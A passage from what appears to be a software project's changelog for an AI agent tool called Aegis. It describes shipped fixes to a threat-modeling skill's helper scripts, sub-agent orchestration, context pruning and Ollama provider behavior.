[roadmap.md](roadmap.md). Also today: **P37.6 shipped** (two threat-model script fixes from a live
dogfood eval — see its entry below), and the **P36 live-verification of P36.1-P36.3 was attempted** on a
real local model (qwen3:14b) for the first time: P36.1 (deterministic skill load) and P37.1 (`recon.py`)
confirmed live, but P36.3's phased orchestration is **refuted** on that model, so the debt is **not
retired** and **P38.1-P38.3** were filed. Earlier: **P37.1-P37.5 shipped** — the
threat-model suite-scripting batch is complete — five bundled stdlib scripts (`recon.py`, `inventory.py`,
`verify.py`, `lint_dfd.py`, `diff_inventory.py`) that codify the mechanical parts of the threat-modeling
skill and leave judgment to the model (see the P37.x entries below). This is the work that lifts the
Aegis builtin past the `.claude/skills/threat-model-analyst` sibling it was benchmarked against. Earlier:
**P36.1, P36.2, and P36.3 shipped**. **P36.3**: the threat-modeling
skill's build stages are now phased through the `agent` tool's `mode: "sequential"` workflow — each
phase runs in a fresh, isolated sub-agent context, loads only its own reference file(s), writes its
own report file, and returns only terse stable identifiers (not file content) to the next phase —
instead of one long-lived, ever-growing run, bounding peak input context per request on local models.
Verifying the sequential-workflow mechanics strengthened the case: the 10-min cap is a *shared pool*
across phases (`maxAgentDuration*(phases+1)`, ~70 min for six phases), not a per-phase cap, so a heavy
phase can run past 10 min, and the spawn depth stays within the depth-3 ceiling. Live local-model
verification of the peak-context win is still outstanding. **P36.1**: skill-triggering slash commands
(`/threat-model`, `/report`, `/research`, `/review`) now inject the activated skill's body
deterministically instead of relying on the model to call the `skill` tool first — closing the Tier 1
gap where a small local model skipped the load and lost the instruction; a pre-existing Windows-only
skills-test failure was fixed in passing. **P36.2**: `compaction.pruneStaleToolResults` now also blanks
confirmed `write_file`/`edit_file` payloads and one-time skill-reference reads in the pre-`keepRecent`
prefix (live token-growth re-measurement still outstanding). Earlier: **P35.13 fully shipped** (its
final open piece, the summed-token-surface decision, resolved today — see the P35.13 entry below).
Earlier: **P35.12 and P35.8 shipped**. **P35.12**: two native-Ollama stream
cosmetics from the P35.9-filing review. `errorMessage` (`internal/provider/ollama/ollama.go`) no
longer surfaces raw JSON when an error envelope is an object without a `message` field — it now also
tries `error`/`detail` string fields and, failing those, compacts the object into a single tidy line
rather than dumping raw multi-line bytes (it still never swallows a present error into ""). Second,
because the native path delivers each tool call *whole* on one NDJSON line, a tool-call argument
payload over the shared 4MiB scanner cap (`internal/provider/sse/sse.go`) previously failed as the
opaque `bufio.Scanner: token too long`; `consume` now detects `bufio.ErrTooLong` and emits an
actionable error naming the cause (an oversized tool-call payload past the 4MiB line limit). Table
tests cover the error-fallback shapes and a >4MiB line. **P35.8**: exit-trace instrumentation for
`aegis chat` (`internal/cli/chat.go`) after a live run once vanished mid-turn leaving nothing on
disk — no panic, no signal record, no final answer. Three seams now log to `aegis.log`: a deferred
`recover` writes the panic value + `debug.Stack()` before re-panicking (registered after the
log-closer defer so LIFO ordering flushes the log before the file closes); the run context now comes
from an extracted `installSignalCancel` helper that logs *which* signal fired (Ctrl-C or SIGTERM,
portable) before cancelling, replacing a bare `signal.NotifyContext(os.Interrupt)` that recorded
nothing; and "run starting"/"run finished" boundary markers bracket `eng.Run`, so a silent
disappearance now shows as a start with no matching finish. The signal helper is unit-tested via a
split-out `watchSignal` (no real OS signal needed). No behavior change beyond the panic re-raise.
Earlier the same day: **P35.10 and P35.11 shipped**, closing out Tier 2. **P35.10**:
`InputTokens` on the native-Ollama path is the tokens Ollama actually evaluated this turn
(`prompt_eval_count`), which with P35.4 KV-cache residency is only the *newly appended* delta on a
cache-hit turn (37 after turn 1's 3944, per P35.7) — the truthful "prefill work done" number, not
the full prompt/context size. That shift in meaning was undocumented. A consumer audit over every
`InputTokens` reader confirmed the billing/budget/work paths (`internal/cost`, engine run usage,
turn traces, session totals, all `in=` displays) are correct under this meaning, and compaction
already avoids it (the proactive check uses `conv.estimatedTokens()`, not usage). The one genuine
"context size" consumer — the TUI's context-fullness bar (`renderContextBar`) — understates on a
native-Ollama cache-hit turn; left as-is (display-only, no compaction/cost impact; a correct fix
needs an estimated-context number the daemon doesn't yet surface to the UI) with the caveat
documented at the call site, the mapping site (`internal/provider/ollama/ollama.go`), and the
`Usage.InputTokens` doc (`internal/provider/provider.go`). No behavior change. **P35.11**:
`probeProviderReachability` (`internal/server/provider_health.go`) fired a live Ollama
`GET /api/version` on every `/status` poll; a 1-2s UI poll loop meant a steady upstream request
stream for a value that changes rarely. The probe result (reachable + latency) is now cached for a
3s window under a mutex, so a fast poll loop coalesces to at most one upstream request per window;
the actual probe runs outside the lock (it can block on a 2s timeout), and a same-tick cold race
just writes an equivalent entry. Tests (with an injected clock seam and a counting fake Ollama
server) assert coalescing, expiry-triggered re-probe, and clean behavior under `-race` with 32
concurrent callers. Earlier the same day: **P35.9 shipped**: the native-Ollama adapter's `translate()`
(`internal/provider/ollama/ollama.go`) resolved tool-result names from a single ID→name map built
over the *entire* message history, last write wins. Because `consume` mints tool-use IDs from a
counter that resets every request (`tu_0`, `tu_1`, …), the same ID recurs across turns naming
whatever tool was called first each time — a normal shape for a mixed-tool agentic run (e.g.
read-file in turn 1, run-shell in turn 3, both minted as `tu_0`). That collision meant every
earlier turn's tool result got silently relabeled with a later turn's tool name, both misleading
the model about which tool produced which result and mutating the serialized prefix between
requests — defeating Ollama's KV-cache prefix reuse (the fourth cache-invalidation candidate that
P35.7's non-determinism sweep didn't catch, since it only checked same-index-same-tool runs).
Fixed by resolving each `ToolResultBlock` against the nearest *preceding* `ToolUseBlock` in message
order instead of a whole-history map — correct regardless of ID reuse, requires no change to ID
minting, and repairs already-stored sessions with colliding IDs on next read. Regression test
(`TestTranslateReusedToolIDsResolvePositionally`) covers both the mislabelling and a byte-stability
assertion that turn 1's serialized prefix is unchanged by appending turn 2. Earlier the same day:
**P35.7 live-confirmed**: a real `aegis chat` run against Ollama
(`qwen3:14b`, resident via `keep_alive`) doing a STRIDE threat model of an external repo captured 8
turns of `prompt_eval_count`/`prompt_eval_duration_ms`. Turn 2 needed only 37 new prefill tokens
after turn 1's 3944 (103ms), and turns 5-8 held the same pattern as context grew from 17.6k to 19k
tokens (`prompt_eval_duration_ms` tracking each turn's token *delta* at ~2-4.7ms/token, not the
running total — turn 8 processed 19038 total context tokens in 3.3s, far below what a full
reprocess at the observed per-token rate would take). This resolves the question the diagnostic was
filed to answer: Ollama's KV-cache prefix reuse **is** working under P35.4's `keep_alive` residency,
so P35.5's timeout was genuinely about the ceiling being too low for large one-off prefill jumps
(e.g. a tool result dumping a large file listing), not about repeated full-context reprocessing. No
response-header timeout or error occurred at any point in the run, so P35.6's actionable-error path
went untested live but also unneeded. Follow-up fix shipped alongside: `aegis chat` never wired
`cfg.LogLevel` into a real logger, so this debug-level prompt_eval instrumentation was invisible on
the one CLI path most likely to be used for this exact diagnostic — `internal/cli/chat.go` now
builds a `logging.New` logger and passes it into `engine.New`, mirroring the existing
`serve`/`acp`/`mcp-serve` pattern. (Original diagnostic-only writeup, no live data, is preserved
below for the record.) Earlier the same day: **P35.6**: when P35.5's response-header timeout fires on the
native-Ollama or OpenAI-compat path, the bare Go transport string
(`net/http: timeout awaiting response headers`) — indistinguishable from a dead server, naming no
remedy — is now rewrapped into an actionable, non-retryable error naming the cause (prefill on a
local backend slower than the configured budget) and the levers (raise
`provider.response_header_timeout`, lower `context_window`, reduce per-turn context growth),
mirroring P35.2's context-truncation precedent. Earlier the same day: **P35.5**: native-Ollama
agentic runs no longer die outright on a
large-context prefill — `provider.response_header_timeout` (seconds) now lets a slow-prefill local
box raise the shared 5-minute HTTP response-header timeout that every provider adapter's streaming
client enforces, discovered when a live `/threat-model stride` re-run on the doctor-recommended
native-Ollama setup got 5 turns / 27 tool calls / ~62k input tokens deep and still died with
`net/http: timeout awaiting response headers`. Default unchanged (5 minutes) so nothing changes
unless a user opts in. Earlier the same day: **P35.1-P35.4**: the four
stacked failures found running the threat-modeling skill against an external repo on the
doctor-recommended local setup (Ollama, qwen3.6:35b). `aegis chat` now wires configured built-in
skills into its tool registry (P35.1); context-limit truncation mid-tool-call surfaces an
actionable "raise provider.context_window" error instead of an opaque JSON-parse failure (P35.2);
`aegis doctor` calibrates its recommended `context_window` against the model's real
training-context max instead of a fixed 16GB-safe 32768 (P35.3); the threat-modeling skill now
steers toward bounded/chunked large-file reads (P35.4, skill half); and the native Ollama path now
defaults `keep_alive` to a bounded 30m resident window so a multi-turn run keeps the model loaded
and reuses its KV cache across turns instead of reprocessing the whole conversation each turn
(P35.4, provider half). Earlier: **P33.21 and P33.22**: ACP now
surfaces `KindToolCallStart` as a
`pending` tool-call notification that the matching `KindToolCall` upgrades in place, `bg events`
prints the same start timing, and `escPending` was renamed to `backtrackArmed`. Earlier the same
day: **P33.12**: the first-run wizard and `/security-config` editor now
composite over the live chat via `renderOverlay`, the same treatment the approval dialog (P33.6),
transient panels (P33.11), and completion popup (P33.18) already use, instead of replacing the
frame outright. Earlier: **P34.11**: grype reinstated into the multiscanner image for tool
centralization, which was P34.11's own activation trigger, so the parked build-artifact-exclusion
fix shipped with it. Earlier: **P34.12**, the last Tier 2 item: osv-scanner's exit-128 "no package
sources" refusal, which turned out to need two-way disambiguation rather than the one-way mapping
its own filing proposed. Earlier the same day: **P34.9** and **P34.10**, clearing the rest of Tier
2 — njsscan's Windows traceback (a libsast bug, not the semgrep gap the item diagnosed) and
trivy's silent npm dev-dependency skip. Earlier still: **P34.5-P34.8**, the previous Tier 2 batch.

---

### P38.4 — Deterministic skeleton scaffolding: fill structure, don't author it

Filed and shipped 2026-07-20. The 2026-07-20 qwen3:14b live test (via P38.2 drive-to-completion) confirmed
the P38.1 linear build's *mechanism* — one context, no orchestration, `recon.py` → all seven files → the
P37 check scripts, inside the window — **but its output did not conform.** The 14B model never loaded
`references/output-formats.md` or the framework skeleton, so its files had no Element/Data-Flow tables, no
`### FIND-##` headings, used `graph TD` instead of `flowchart LR`, and baked headings into content;
`verify.py` failed 6/10 and it couldn't self-converge because it **re-authored freeform structure on every
correction pass** (full-content `write_file`) instead of filling a fixed one. The root cause was that the
skill *relied on the model reading and copying the skeleton templates*, and a 14B model skips that step.

The fix moves that determinism out of the model's hands. A new bundled script, **`scaffold.py`** (the
skill's sixth `.py`, stdlib-only, deterministic), pre-writes all seven files *from the skeletons*:

- **Real structure, machine-applied.** Every fixed heading, every table's header row + separator (matching
  `verify.py`'s `find_table` requirements exactly), the fixed-value reference lists, and the DFD's
  `flowchart LR` header + three verbatim `classDef`s — the five framework-agnostic files from
  `output-formats.md` and the one framework-specific analysis file from `skeletons/skeleton-<framework>.md`.
- **A `<!-- PENDING -->` marker per fillable section**, so the model **edits cells into a fixed table**
  rather than inventing the table — and the P38.2 drive-to-completion marker oracle (which the 14B model
  otherwise starved by writing full content, no markers) is now fed reliably.
- **Facts only, never decisions.** It writes empty structure; every judgment cell is a PENDING the model
  fills. It reads no clock (timestamps stay PENDING, so they're never guessed) and invents no component,
  threat, severity, or deployment class. It never clobbers a file whose PENDING markers are already gone,
  so re-running on an in-progress directory is safe (`--force` overrides).
- **All six frameworks** (`stride`, `linddun`, `pasta`, `trike`, `vast`, `nist-800-154`) plus `stride-a`.

SKILL.md §4.1 step 2 now calls `scaffold.py` instead of hand-writing bare stubs; §4 and §4.2 were updated
so the model fills PENDING markers one section at a time (the non-convergent whole-file re-author is called
out as exactly what scaffolding prevents). README.md documents the sixth script.

**Validation.** A freshly-scaffolded suite passes `lint_dfd.py` 6/6 (the DFD stub is deliberately
lint-clean from turn one — `flowchart LR`, the three classDefs, and a `%%`-commented PENDING that lint
ignores but `verify.py`/the drive-oracle still see, plus a byte-identical `1-model.md` fence). A
minimally-filled suite passes `verify.py` 9/9 — the sole remaining failure is the intentionally-unfilled
DFD stub's PENDING marker — proving the scaffolded structure is verify-clean once filled, so self-correction
now converges against a real structure instead of a freshly-authored one each pass. `go test
./internal/skills/...` and `./internal/cli/...` stay green (the scripts are `//go:embed builtin`-recursive,
so `scaffold.py` embeds automatically). This directly unblocks **P38.1**'s conformance re-test.

---

### P38.2 — `aegis chat --skill`: preload a skill body and drive it to completion

Filed and shipped 2026-07-20. A one-shot `aegis chat` turn ends when the model yields, so a long,
multi-phase skill (threat model, deep research) — many turns in one context — stops at the first pause
with a partial suite. Both prior live threat-model runs did exactly this, ending on *"Would you like me to
proceed? (~70 min)"* even after an explicit "do not stop". `aegis chat` gained **`--skill <name>`**, which
makes a scripted skill run actually finish:

- **Preloads the skill body.** The named skill's full instructions are prepended to the first user message
  (framed like the TUI's `/threat-model` path), so a small local model never depends on the
  `skill`-tool round-trip that progressive disclosure assumes and that P36.1 showed such models skip. The
  skill is enabled on top of the config's builtin list for the run, and — new for the CLI path — the
  embedded built-ins are materialized to `<dataDir>/builtin-skills/` (only the daemon did this before), so
  a freshly-built binary's skill body and its bundled scripts (`recon.py`, `verify.py`, …) are on disk.
- **Drives to completion.** After each engine run yields, if any file under `.aegis/` still contains a
  `<!-- PENDING -->` marker, chat appends a continuation turn naming the unfinished files and re-runs —
  reusing the *same* `engine.Conversation`, so context threads and pruning/compaction apply across the
  whole drive. Bounded by `--max-turns` (default 40) and a no-progress guard (three consecutive yields
  that call no tool at all → stop, rather than burn tokens on a model that's only talking).

The completion oracle is the stub-first `<!-- PENDING -->` pattern the skills already use (SKILL.md §4.1):
a marker is unambiguous unfinished work, and zero markers ends the drive. A model that writes full file
content without ever stubbing (observed on qwen3:14b, which skips the setup step) simply ends when it
yields — correct when it finished, a known limitation when it didn't, but never a wrong forced
continuation; making the stubs deterministic is P38.4's job. New logic (`scanPendingMarkers`,
`continuePrompt`, `skillPreamble`, `appendUnique`) is unit-tested in `internal/cli/chat_drive_test.go`.
This is what made the P38.1 linear-build live test possible: qwen3:14b drove the full seven-file build in
one context, no orchestration and no `{mode,agents}` mis-route — see [roadmap.md](roadmap.md)'s P38.1 and
P38.4 for the mechanism-confirmed / conformance-still-open result.

---

### P37.6 — Two threat-model script fixes from the AiGateway live dogfood eval

Filed and shipped 2026-07-20. A sub-agent drove the improved threat-modeling skill end-to-end against a
real external target (`D:\Development\AiGateway`, a FastAPI AI gateway), following the SKILL.md playbook
and running all five bundled scripts. The suite came out clean (verify 9/9, lint_dfd 6/6, inventory
--check 10/10), but the eval surfaced one genuine, previously-uncaught bug and one missing guard:

- **`inventory.py` deployment-classification mis-parse (the real bug).** `parse_deployment()` returned
  the first of the fixed class list (`internet-facing`, `internal-network`, …) that appeared *anywhere*
  in the Deployment Classification section, by **list order**. Since SKILL.md §2 *requires* documenting
  where you overrode recon's suggestion, a section that asserts `internal-network` but discusses the
  rejected `internet-facing` recorded the wrong class in the sidecar — and nothing caught it
  (`--check` re-parses the same prose so it agreed; the classification value had no cross-check). Fixed
  to prefer an explicit `Deployment classification:` label line (the skeletons' binding form), then fall
  back to the first class token in **document order** (the asserted class leads; evidence prose follows),
  with HTML comments stripped so a leftover template comment can't seed a false match. Verified across
  override-prose, label-precedence, comment, and plain cases.
- **New `verify.py` check #10 — architecture↔analysis classification agreement.** Nothing asserted that
  `0.1-architecture.md` and `2-<framework>-analysis.md` name the *same* deployment class, though it is
  binding on every prerequisite floor and CVSS `AV`. `verify.py` now imports `inventory.py`'s hardened
  parse (single-sourced, so the two scripts can't disagree) and fails on a divergence. `verify.py` is now
  ten checks; SKILL.md and the skill README updated to match.

`python -m py_compile` clean on both; verify.py 10/10 and inventory.py --check 10/10 on the eval's suite;
the new check confirmed to fire on a synthetic divergence. Two related recon/inventory follow-ups the
same eval raised (recon downgrading `internet-facing`→`internal-network` when the k8s Service is
NodePort/ClusterIP with no ingress/TLS; `inventory.py` capturing the *target* repo's commit when the run
dir lives outside it) are filed as leads under the roadmap's Tier-3 recon note.

### P37.5 — Deterministic baseline diff for incremental threat-model updates

Filed and shipped 2026-07-19. The update workflow (SKILL.md §6) compares a baseline run against a fresh
one and reports new / resolved / still-present / changed threats. Matching is defined on the stable ids
and fingerprints `inventory.yaml` carries, so it is a script's job, not the model's. `diff_inventory.py`
takes two sidecars and classifies each threat: id-match first, then a fingerprint fallback
(component + category + title-ish) so a threat that kept its identity but changed id is still tracked;
it reports category and tier deltas per changed threat. It parses both the block-style and the one-line
flow-mapping YAML `inventory.py` emits (a bug caught and fixed during review — the generator writes flow
mappings, the diff originally only read block style). The STRIDE-A 7th-category letter was corrected to
**Abuse** (`A`); authorization failures stay under Elevation (`E`). Deterministic, sorted output; drives
the Changes Since Baseline section free of the eyeballing-two-YAMLs error class. `python -m py_compile`
clean; verified end-to-end against a real `inventory.py`-generated pair (correctly classified
changed/new/resolved/still-present).

### P37.4 — Mermaid DFD pre-render lint script

Filed and shipped 2026-07-19. `references/diagram-conventions.md`'s pre-render checklist for
`1.1-model.mmd` is entirely mechanical, so `lint_dfd.py` (stdlib) now runs it: `flowchart LR` direction,
the three-palette `classDef` fills/strokes, no stray markdown code fence or leftover keyword, balanced
`subgraph`/`end` pairs, labeled edges, and `.mmd`↔`.md` equality (the diagram embedded in `1-model.md`
must match the standalone `.mmd`). Accepts a `.mmd` file, a `1-model.md`, or a run directory; tolerant of
`%%` comments and the `%%{init}%%` block. Six checks, run in phase 6 whenever the DFD changed, catching
at review time the errors the model otherwise self-polices before anyone renders the diagram.
`python -m py_compile` clean; 6/6 pass on conformant input, each check confirmed to catch its break.

### P37.3 — Mechanical cross-file self-check as `verify.py`

Filed and shipped 2026-07-19. SKILL.md §5's review round and `verification-and-updates.md`'s "Final
self-check" are largely *mechanical* cross-file assertions, and the P36.3 phased design (each phase in
its own context) is exactly what *creates* the cross-file drift they target. `verify.py` runs the
grep-able subset over a finished run: no leftover skeleton syntax, component-name consistency across the
files that name them, every `DF##` reference defined, threat↔coverage bijection (every analysis threat
appears exactly once in the coverage table), finding ids sequential, tier/prerequisite consistency,
count agreement, no forbidden coverage statuses, and external-AV consistency (nine checks). Built on a
generic markdown-table parser so it survives column reordering. Prints PASS/FAIL per check; the phase-6
sub-agent then reasons only about genuinely judgment-bound seams (does this control actually contradict
that one). `python -m py_compile` clean; 9/9 pass on a clean run and each check confirmed to catch a
seeded defect.

### P37.2 — Generate and validate `inventory.yaml` with a script, not from model memory

Filed and shipped 2026-07-19. The `inventory.yaml` sidecar is a machine-readable index (stable
component/threat ids, tiers, statuses) whose whole purpose is *matching* — a later run diffing against
it. The sibling `.claude/skills/threat-model-analyst` documents that generating this from model memory
is its **#1 and #2** quality issues: truncated arrays (large repos exhaust output tokens mid-serialize)
and field-name drift. Both vanish with `inventory.py`, which parses the finished `2-<framework>-analysis.md`
+ `3-findings.md` + `0.1-architecture.md`, extracts every threat/finding/component row, **derives each
threat's tier from its prerequisite** (so the sidecar can't disagree with the analysis), sorts by id,
and emits deterministic YAML — metadata block-style, list entries as one-line flow mappings. A `--check`
mode regenerates in-memory and diffs against the on-disk file, exiting non-zero on any drift; phase 5
runs the generator, the phase-6 review round runs `--check`. Same split as `recon.py`: the script owns
the mechanical extraction, the model owns none of it. `python -m py_compile` clean; 10/10 checks pass on
a generated-then-validated run.

### P37.1 — Deterministic recon script for the threat-modeling skill's architecture phase

Filed and shipped 2026-07-19. The threat-modeling skill's phase-1 architecture step (SKILL.md §2) was
pure model labour: list directories, read entry points, config, auth code, network handlers, and
data-access layers, then infer components/boundaries/flows from what it happened to read. On a large
repo that means pulling megabytes of source through the context window — the exact peak-context load
the P36.3 phased restructure exists to bound — and it is inherently non-deterministic, which is why the
skill (and its `.claude/skills/threat-model-analyst` sibling) spend hundreds of lines of prose trying to
force stable component ids, boundary counts, and fingerprints out of an LLM. P37.1 moves the mechanical
half of that work into a bundled `internal/skills/builtin/threat-modeling/recon.py` (Python 3, stdlib
only, `go:embed`-ed with the skill and surfaced in its `<skill_assets>` manifest like the latex-report
scripts). One deterministic filesystem pass emits a compact digest: git metadata, language histogram,
parsed dependency manifests (go.mod / package.json / requirements / pyproject / Cargo / composer /
Gemfile / pom / gradle / Dockerfile / compose / Helm), bind/listen sites split into real listener calls
vs bare address literals (test files excluded) with an evidence-based **suggested** deployment class,
entry points, config/env keys, security-infrastructure signal families, external-egress signals, and
per-file declared symbols ranked security-relevant-first as component candidates. On this repo (~540
source files) the digest is ~11KB vs the megabytes a raw read would cost; on a synthetic Flask app it
correctly flags `internet-facing` (0.0.0.0 bind + Dockerfile EXPOSE, `USER root`), extracts env keys and
classes, and handles non-git/empty/missing dirs cleanly.

The design line is strict: **facts only, never decisions.** Everything the digest labels a suggestion
(deployment class, security infra, component candidates) is evidence the model confirms or overrides per
§2's rules — the script lists only symbols that actually exist, so it structurally cannot invent the
`ConfigurationStore`/`DataLayer` abstractions the skill warns against, but it also never decides
eligibility, boundaries, threats, or severities. A known limit surfaced and is handled honestly: when a
listener's bind address is config/flag-driven (Go's `srv.ListenAndServe()` reading `srv.Addr`, as in
Aegis's own daemon) the address isn't a literal recon can read, so it detects listener *presence*,
suggests `localhost-service`, and explicitly tells the model to confirm the config default and any
bind-to-all/allow-remote flag — rather than mis-classifying in either direction. SKILL.md §2 is
rewritten to run recon first and read its digest *instead of* the raw tree, then read selectively only
to confirm or fill gaps; the §4.2 phase-1 row and §1 reference table point at it. No Go changes — the
skill is `go:embed`-ed, so rebuilding re-embeds the script and its edited markdown.
`go test ./internal/skills/...` passes; `python -m py_compile recon.py` clean. Follow-ups
(P37.2-P37.5) extend the same approach to `inventory.yaml` generation/validation, the final self-check,
DFD linting, and incremental diffing.

### P36.3 — Phase the threat-modeling skill through sub-agents instead of one long-lived run

Filed and shipped 2026-07-19. The threat-modeling skill previously ran as one ever-growing
conversation — every reference file (172KB of `references/` exists), every workspace-exploration read,
and every written report file (files ran 18–90KB; one STRIDE analysis was 88KB) accumulated in a
single context, which on a local model is what kills the run: a large prefill blew the native
adapter's response-header timeout at ~62k input tokens before a file was written (P35.5–P35.9). P36.2
made that growth slower without changing the shape; P36.3 changes the shape. `SKILL.md` §4 is
rewritten so the top-level run does only cheap setup (pick target slug + timestamp, create the
directory, `write_file` seven `<!-- PENDING -->` stubs) and then issues **one** `agent` call with
`mode: "sequential"` and a six-entry `agents` array (`subagent_type: "build"` each) — Architecture →
Model/DFD → Framework analysis → Findings → Assessment+inventory → Review. Each phase runs in a fresh,
isolated context, loads only its own reference file(s), reads prior files from disk, writes the file(s)
it owns, and returns **only terse stable identifiers** (component names/anchors, `DF##` ids, threat IDs
with their tier/severity) — never file content, since the content is durably on disk. A verbatim
"terse-final-answer contract" block is mandated in every phase prompt because the sequential workflow
prepends each phase's *full* final answer to the next phase's prompt (`executeWorkflow`'s `spawn`
closure, `internal/tool/builtin/agent.go`), so a phase that dumps content reintroduces the bloat one
level down.

Verifying the agent-tool mechanics corrected the roadmap's key assumption and strengthened the case:
`maxAgentDuration` (10 min) is a hard per-agent cap only in *single-agent foreground* mode; in the
sequential path the deadline is a **shared pool** `maxAgentDuration*(len(agents)+1)` (~70 min for six
phases) that every phase draws from, so the heavy framework-analysis phase can run well past 10 min as
long as the whole run fits — and splitting a phase *raises* the pool while lowering peak context.
`maxSpawnDepth` (3) is safe: slash command → main run (depth 0) → phase agents (depth 1) → phase-6 P12
debate roles (depth 2). `subagent_type:"build"` sub-agents get write capability and the spawning
turn's workdir, and the full tool registry (so phase 6 can run the debate). The governance rule in
`references/verification-and-updates.md` ("only the orchestrating run writes report files") is replaced
with phased-orchestration governance: files are written by the owning phase, only stable identifiers
cross a phase boundary, and the phase-6 review round (re-reading the complete suite fresh from disk) is
the consistency guarantee for the distributed writes. The incremental-update workflow is explicitly
mapped onto the phases (baseline inventory IDs thread into phase 1; phase 3 verifies baseline threats;
phase 5 writes "Changes Since Baseline") so it is not regressed. No Go changes — the skill is
`go:embed`-ed, so rebuilding the binary re-embeds the edited markdown. **Live verification
outstanding**: a real local-model `/threat-model stride` run is still needed to confirm peak input
context per request actually stays under the response-header timeout, and that a small local model
honors the terse-final-answer contract (it's prose, not code-enforced — the biggest residual risk).
`go build ./...` clean; `go test ./internal/skills/... ./internal/bundle/... ./internal/tui/...` pass.

### P36.1 — Skill-triggering slash commands now inject the skill body deterministically

Filed and shipped 2026-07-19. `/threat-model`, `/report`, `/research`, and `/review` (content-review)
used to activate a built-in skill for the session and then send a plain-text "Load the X skill and …"
message, relying entirely on the model choosing to call the `skill` tool first. A capable cloud model
follows that; a small local model (Ollama) skipped the tool call, ran a generic directory listing,
landed on the just-materialized `.aegis/skills/threat-modeling/` folder, and replied as if that
listing were the whole input — losing the original instruction. The initial top-level skill load is
now deterministic: `handleActivateSkill` (`internal/server/sessions.go`) loads the just-activated
skill via `skills.Load` and returns its body in the activation response (`api.ActivateSkillResponse`,
`internal/api/api.go`); `client.ActivateSkill` (`internal/client/client.go`) now returns
`(body, error)`; and the TUI's shared `skillTaskMessage` helper (`internal/tui/slash.go`, used by all
four commands and `cmdReview` in `slash_diff.go`) prepends the body inside a delimited
`<skill name="…">…</skill>` block ahead of the task text. A load miss degrades gracefully to today's
name-only behavior with a warning — nothing hard-errors. The `skill` tool stays registered and is
still the path for the progressive `references/*.md` assets a skill loads later; only the *initial*
body load — the step a small model was skipping — moved off the tool round-trip. The seam is
server-side because the TUI `SlashDispatcher` carries only `workDir`, not `dataDir` or the session's
enabled-builtins set, so it cannot resolve a dormant embedded skill locally. Tests: server-side
`TestActivateSkill_ReturnsSkillBody`; TUI `TestSkillTaskMessagePrependsBody` and
`TestSkillTaskMessageDegradesWithoutBody`. The optional second-layer engine turn-budget reminder from
the filing was deliberately not built — the deterministic inject is the complete fix and the reminder
would touch the engine loop for marginal gain.

Found alongside (fixed here): `TestDiscoverProjectMaterializedBuiltin`
(`internal/skills/skills_test.go`) asserted the `<skill_assets dir="…">` manifest path with
`filepath.Join`, whose OS-native separators are backslashes on Windows, while the production
`withAssetManifest` correctly normalizes the manifest to forward slashes via `filepath.ToSlash` (what
the model's file tools expect cross-platform) — so the test spuriously failed on Windows only, on
clean HEAD, unrelated to any P36 work. The assertion now wraps its expected path in `filepath.ToSlash`
to match production behavior; the production code was already correct.

### P36.2 — Deterministic pruning now covers write/edit payloads and one-time skill-reference reads

Filed and shipped 2026-07-19. `compaction.pruneStaleToolResults` (`internal/compaction/prune.go`)
previously blanked only two things in the pre-`keepRecent` prefix: a `read_file` result whose path was
re-read later, and a large `grep`/`glob`/`ls` dump superseded by an identical later call. Two large,
avoidable sources of per-turn context growth fell through both rules during a long run (e.g. a
threat-modeling suite whose written files ran 18–90KB): (1) `write_file`/`edit_file` tool-call
*payloads* — the full file content is the tool_use **Input**, never rewritten before because the
function only ever touched `ToolResultBlock`s — and (2) one-time skill-reference reads (`SKILL.md`
plus the ~70KB of `references/*.md` a STRIDE run loads), which the read_file dedup rule never fires on
because it only triggers on a *second* read of the same path. Now: once a `write_file`/`edit_file`
tool_use in the prefix has a *successful* result, its content field(s) (`content` for write;
`old_string`/`new_string` for edit) are rewritten to minimal well-formed JSON keeping the `path` and a
`[pruned: N chars … re-read the file if needed]` marker — safe because the file is durably on disk and
re-readable; and a `read_file` under a skill directory (matched by a `.aegis/skills/` or
`builtin-skills/` path substring, so no new `workDir`/`dataDir` threading through the compaction seam)
is pruned even on first use once superseded by `keepRecent`, since skill reference content is static.
Only the pre-`keepRecent` prefix is touched, error results are never pruned, the recent window is
untouched, and the char-removed accounting uses the net serialized-size delta (guarded non-negative,
and refuses to prune when it wouldn't actually shrink). Tests cover both rules, a pruned-Input
round-trip deserialize, and the failed-write / recent-write negatives. Not covered: `multi_edit`
(nested `edits[]`), flagged as a follow-up lead. **Live verification outstanding** — the roadmap wants
a real local-model run confirming reduced measured `prompt_eval_count` growth turn-over-turn; no
Ollama server was available this session, so that re-measurement remains to be done. Note also an
interaction to watch with P36.1: its deterministic skill-body inject lands in a *user* message, which
`pruneStaleToolResults` never touches — so a slash-triggered skill's body is not pruned by P36.2's
skill-reference rule (which only matches `read_file` results). Weigh whether the injected block should
itself become prunable if peak context still threatens the response-header timeout.

### P35.13 — `prompt_eval_count` is the full prompt count on current Ollama, not the cache-hit delta

Filed 2026-07-18 from the first live telemetry run, which inverted an assumption P35.10 had baked
into two package docs. On Ollama 0.30.10 (qwen3:14b), `prompt_eval_count` — and therefore
`Usage.InputTokens` on the native path — is the **full** prompt/context size *every* turn, not the
newly-appended prefill delta P35.10 claimed. Live evidence: an identical prompt sent twice to raw
`/api/chat` returned the same full `prompt_eval_count` both times while `prompt_eval_duration`
collapsed (84ms→24ms); a warm Aegis turn reported `prompt_eval_count=7195` in 86ms, which is
impossible for real prefill — the prefix was a cache hit yet the full count was still reported.
P35.10's cited "37 after turn 1's 3944" was a misread of the growth in the count (3981−3944) as
the count itself. So `prompt_eval_duration` — not the count — is the only KV-cache-hit signal on
this Ollama.

Items 1 and 2 (the doc/comment corrections) shipped 2026-07-18: the `chunk.Done` block in
`internal/provider/ollama/ollama.go`, the `Usage.InputTokens`/`Usage.PromptEvalDurationMS` docs in
`internal/provider/provider.go`, and the P35.7 diagnostic comment in `internal/engine/engine.go`
now describe full-count semantics and name duration (not count) as the cache signal, keeping a
note that older Ollama versions may have reported deltas (version-dependent, so compaction keeps
using `estimatedTokens` regardless). A related fix landed the same pass: `internal/cli/init.go`'s
`--first-init` template now emits the native `default: ollama` adapter with a `context_window`
guidance block instead of the legacy `default: openai` + `/v1` compat path the daemon warns
against (guarded by an `inittmpl_verify_test.go` assertion).

**Item 3 (the summed-token-surface decision) shipped 2026-07-19**, resolved as **"tokens
processed"** and driven by the maintainer's priority that the figure be accurate as *cloud cost*.
The roadmap's "overstates prefill work by the cache-hit factor" concern is a *local-compute*
property with no cost consequence: a cloud provider re-sends and re-bills the growing conversation
on every agentic turn, and prompt-cache reads are billed separately (tracked as
`CacheReadTokens`/`CacheCreationTokens` and priced at the discounted rate in `internal/cost`), so
